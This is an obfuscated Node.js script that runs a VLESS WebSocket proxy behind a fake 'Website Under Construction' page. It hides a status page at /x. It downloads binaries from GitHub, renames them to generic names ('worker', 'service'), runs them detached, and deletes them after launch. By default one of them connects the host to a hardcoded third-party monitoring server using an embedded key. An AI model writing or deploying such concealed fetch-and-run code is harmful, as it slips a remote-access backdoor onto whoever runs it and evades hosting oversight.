#!/usr/bin/env node

const _0x536f=['NZ_CLIENT_SECRET','node','write','status','url','now','toString','&fp=chrome&security=tls#','EADDRINUSE','once','join','nzv1','map','arm64','writeHead','&encryption=none&sni=','headersSent','reduce','includes','readyState','error','get','/vl','listen','pgrep\x20-x\x20','vless://','application/json','substr','PORT','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','tmpdir','readUInt16BE','host','exit','N_S','catch','code','listening','slice','protocol','&host=','https:','ignore','OPEN','NZ_UUID','UUID','replace','-arm','pipe','Internal\x20Server\x20Error',':443?type=ws&path=','filter','env','send','.write_test_','N_P','concat','true','uptime','access','location','every','text/html','C_B','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>','text/plain','N_K','decode','443','end','connection','unlink','/health','unref','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','C_D','headers'];const _0x1314=function(_0x536f1c,_0x131431){_0x536f1c=_0x536f1c-0x0;let _0x56c393=_0x536f[_0x536f1c];return _0x56c393;};const {exec,spawn}=require('child_process');const {WebSocketServer,createWebSocketStream}=require('ws');const http=require('http');const https=require('https');const {URL}=require('url');const net=require('net');const {join}=require('path');const {promises:fs,createWriteStream,chmodSync}=require('fs');const os=require('os');const CONFIG={'UUID':(process[_0x1314('0x34')][_0x1314('0x2d')]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98')[_0x1314('0x2e')](/-/g,''),'PORT':process['env'][_0x1314('0x1c')]||0xbb8,'N_S':process['env']['N_S']||'newnz.seav.eu.org','N_P':process[_0x1314('0x34')][_0x1314('0x37')]||_0x1314('0x44'),'N_K':process[_0x1314('0x34')][_0x1314('0x42')]||'cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg','NZ_UUID':process['env'][_0x1314('0x2c')]||'','C_B':process[_0x1314('0x34')]['C_B']||'www.shopify.com','C_T':process['env']['C_T']||'','C_D':process[_0x1314('0x34')]['C_D']||''};const FILE_NAMES={'nzv1':'worker','cf':'service'};let WORK_DIR;const isPortInUse=_0x54a9ea=>new Promise(_0x31b08c=>{const _0x11c634=net['createServer']();_0x11c634[_0x1314('0x9')](_0x1314('0x14'),_0x570dfe=>_0x31b08c(_0x570dfe[_0x1314('0x24')]===_0x1314('0x8')));_0x11c634['once'](_0x1314('0x25'),()=>{_0x11c634['close']();_0x31b08c(![]);});_0x11c634[_0x1314('0x17')](_0x54a9ea);});const isProcessRunning=_0x1d7ee9=>new Promise(_0x95d721=>{exec(_0x1314('0x18')+_0x1d7ee9,(_0x78f24c,_0x2a99d8)=>_0x95d721(!_0x78f24c&&_0x2a99d8['trim']()['length']>0x0));});const fileExists=async _0x585336=>{try{await fs[_0x1314('0x3b')](_0x585336);return!![];}catch{return![];}};const isWritable=async _0x730a6=>{const _0xb4162a=join(_0x730a6,_0x1314('0x36')+Date[_0x1314('0x5')]());try{await fs['writeFile'](_0xb4162a,'test');await fs[_0x1314('0x47')](_0xb4162a);return!![];}catch{return![];}};const initWorkDir=async()=>{if(await isWritable(os[_0x1314('0x1e')]())){WORK_DIR=os[_0x1314('0x1e')]();}else{WORK_DIR=process['cwd']();}};const requestStream=(_0x5bd3d9,_0x2f2b48=0x0)=>new Promise((_0x385407,_0x1bb7b4)=>{const _0x2af112=new URL(_0x5bd3d9);const _0x52199e=_0x2af112[_0x1314('0x27')]===_0x1314('0x29')?https:http;const _0x4531c2=_0x52199e[_0x1314('0x15')](_0x2af112,{'headers':{'User-Agent':_0x1314('0x1')}},_0x94146c=>{const _0xfaa845=_0x94146c['statusCode']||0x0;if([0x12d,0x12e,0x12f,0x133,0x134][_0x1314('0x12')](_0xfaa845)&&_0x94146c[_0x1314('0x4c')]['location']){_0x94146c['resume']();if(_0x2f2b48>=0x5)return _0x1bb7b4(new Error('Too\x20many\x20redirects'));const _0x2f43e7=new URL(_0x94146c[_0x1314('0x4c')][_0x1314('0x3c')],_0x2af112)[_0x1314('0x6')]();requestStream(_0x2f43e7,_0x2f2b48+0x1)['then'](_0x385407,_0x1bb7b4);return;}if(_0xfaa845>=0x190){_0x94146c['resume']();return _0x1bb7b4(new Error('Request\x20failed:\x20'+_0xfaa845));}_0x385407(_0x94146c);});_0x4531c2['on'](_0x1314('0x14'),_0x1bb7b4);});const downloadBinary=async(_0xe8962b,_0x24c43f)=>{const _0x1c26fd=await requestStream(_0xe8962b);const _0x41eb05=createWriteStream(_0x24c43f);return new Promise((_0x81e85b,_0x3070d1)=>{_0x1c26fd[_0x1314('0x30')](_0x41eb05);_0x1c26fd['on']('error',_0x3070d1);_0x41eb05['on']('finish',()=>{chmodSync(_0x24c43f,0x1ed);_0x81e85b();});_0x41eb05['on'](_0x1314('0x14'),_0x3070d1);});};const vlessLink=()=>_0x1314('0x19')+CONFIG['UUID']+'@'+CONFIG[_0x1314('0x3f')]+_0x1314('0x32')+encodeURIComponent(_0x1314('0x16'))+_0x1314('0x28')+CONFIG[_0x1314('0x4b')]+_0x1314('0xf')+CONFIG['C_D']+_0x1314('0x7')+CONFIG['C_D'];const HTML_TEMPLATES={'home':'<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','status':(_0x1f0518,_0x52acd1)=>_0x1314('0x4a')+_0x1f0518+_0x1314('0x40')+_0x52acd1+_0x1314('0x1d')+_0x52acd1+'\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>'};const server=http['createServer']((_0x3f3dd3,_0x173149)=>{try{const {pathname}=new URL(_0x3f3dd3[_0x1314('0x4')],'http://'+_0x3f3dd3[_0x1314('0x4c')][_0x1314('0x20')]);if(pathname==='/'){_0x173149[_0x1314('0xe')](0xc8,{'Content-Type':_0x1314('0x3e')});_0x173149[_0x1314('0x45')](HTML_TEMPLATES['home']);}else if(pathname==='/x'){_0x173149['writeHead'](0xc8,{'Content-Type':_0x1314('0x3e')});_0x173149['end'](HTML_TEMPLATES[_0x1314('0x3')](CONFIG[_0x1314('0x1c')],vlessLink()));}else if(pathname===_0x1314('0x48')){_0x173149[_0x1314('0xe')](0xc8,{'Content-Type':_0x1314('0x1a')});_0x173149['end'](JSON['stringify']({'status':'ok','uptime':process[_0x1314('0x3a')]()}));}else{_0x173149['writeHead'](0x194,{'Content-Type':_0x1314('0x41')});_0x173149[_0x1314('0x45')]('Not\x20Found');}}catch{if(!_0x173149[_0x1314('0x10')]){_0x173149[_0x1314('0xe')](0x1f4,{'Content-Type':'text/plain'});_0x173149[_0x1314('0x45')](_0x1314('0x31'));}}});const wss=new WebSocketServer({'server':server,'path':'/vl'});wss['on'](_0x1314('0x46'),_0x5a0ea6=>{_0x5a0ea6[_0x1314('0x9')]('message',_0x1b9106=>{const [_0x1824f2]=_0x1b9106;const _0x1568c2=_0x1b9106['slice'](0x1,0x11);if(!_0x1568c2[_0x1314('0x3d')]((_0x4e0bf2,_0x525a9f)=>_0x4e0bf2===parseInt(CONFIG[_0x1314('0x2d')][_0x1314('0x1b')](_0x525a9f*0x2,0x2),0x10)))return;let _0x181a37=_0x1b9106['slice'](0x11,0x12)['readUInt8']()+0x13;const _0xf39ea3=_0x1b9106['slice'](_0x181a37,_0x181a37+=0x2)[_0x1314('0x1f')](0x0);const _0x457b18=_0x1b9106[_0x1314('0x26')](_0x181a37,_0x181a37+=0x1)['readUInt8']();let _0x2e2fb3;if(_0x457b18===0x1){_0x2e2fb3=_0x1b9106[_0x1314('0x26')](_0x181a37,_0x181a37+=0x4)['join']('.');}else if(_0x457b18===0x2){const _0x4710be=_0x1b9106[_0x1314('0x26')](_0x181a37,_0x181a37+=0x1)['readUInt8']();_0x2e2fb3=new TextDecoder()[_0x1314('0x43')](_0x1b9106['slice'](_0x181a37,_0x181a37+=_0x4710be));}else if(_0x457b18===0x3){_0x2e2fb3=_0x1b9106['slice'](_0x181a37,_0x181a37+=0x10)[_0x1314('0x11')]((_0x469918,_0x20dc5b,_0x297db9,_0x5aa048)=>_0x297db9%0x2?_0x469918[_0x1314('0x38')](_0x5aa048[_0x1314('0x26')](_0x297db9-0x1,_0x297db9+0x1)):_0x469918,[])[_0x1314('0xc')](_0xa4d6ae=>_0xa4d6ae[_0x1314('0x1f')](0x0)['toString'](0x10))[_0x1314('0xa')](':');}if(_0x5a0ea6[_0x1314('0x13')]===_0x5a0ea6[_0x1314('0x2b')]){_0x5a0ea6[_0x1314('0x35')](new Uint8Array([_0x1824f2,0x0]));const _0x52a27d=createWebSocketStream(_0x5a0ea6)['on'](_0x1314('0x14'),()=>{});const _0x59464d=net['connect']({'host':_0x2e2fb3,'port':_0xf39ea3},function(){this[_0x1314('0x2')](_0x1b9106['slice'](_0x181a37));_0x52a27d['pipe'](this)[_0x1314('0x30')](_0x52a27d);});_0x59464d['on'](_0x1314('0x14'),()=>{});}});});async function downloadAndRun(_0x2d3ed1,_0x5588b0,_0x4c408e,_0x1e88cb){if(!_0x2d3ed1)return;const _0x4bec3f=join(WORK_DIR,FILE_NAMES[_0x4c408e]);if(await isProcessRunning(FILE_NAMES[_0x4c408e]))return;if(await fileExists(_0x4bec3f)){await fs['chmod'](_0x4bec3f,0x1ed)[_0x1314('0x23')](()=>{});spawnProcess(_0x4bec3f,_0x5588b0,_0x1e88cb);return;}try{await downloadBinary(_0x2d3ed1,_0x4bec3f);spawnProcess(_0x4bec3f,_0x5588b0,_0x1e88cb);}catch{await fs['unlink'](_0x4bec3f)['catch'](()=>{});}}function spawnProcess(_0x4081d5,_0x4298e2,_0x19d096){const _0x262e2b=spawn(_0x4081d5,_0x4298e2['split']('\x20')[_0x1314('0x33')](_0x1372fb=>_0x1372fb),{'stdio':_0x1314('0x2a'),'detached':!![],'env':_0x19d096||process['env']});_0x262e2b[_0x1314('0x49')]();_0x262e2b['on']('spawn',()=>setTimeout(()=>fs[_0x1314('0x47')](_0x4081d5)['catch'](()=>{}),0x3e8));}const baseUrl='https://github.com/seav1/dl/releases/download/files';const archUrl=_0x22ca59=>process['arch']===_0x1314('0xd')?_0x22ca59+_0x1314('0x2f'):_0x22ca59;(async()=>{await initWorkDir();if(await isPortInUse(CONFIG[_0x1314('0x1c')]))process[_0x1314('0x21')](0x1);server['listen'](CONFIG[_0x1314('0x1c')]);if(CONFIG['N_S']&&CONFIG[_0x1314('0x42')]){const _0x278664={...process['env']};_0x278664['NZ_SERVER']=CONFIG[_0x1314('0x22')]+':'+CONFIG[_0x1314('0x37')];_0x278664[_0x1314('0x0')]=CONFIG['N_K'];_0x278664['NZ_DISABLE_AUTO_UPDATE']='true';if(CONFIG['NZ_UUID']){_0x278664['NZ_UUID']=CONFIG['NZ_UUID'];}_0x278664['NZ_TLS']=_0x1314('0x39');await downloadAndRun(archUrl(baseUrl+'/nzv1'),'',_0x1314('0xb'),_0x278664);}await downloadAndRun(archUrl(baseUrl+'/cf'),'tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20'+CONFIG['C_T'],'cf');})()[_0x1314('0x23')](()=>process[_0x1314('0x21')](0x1));
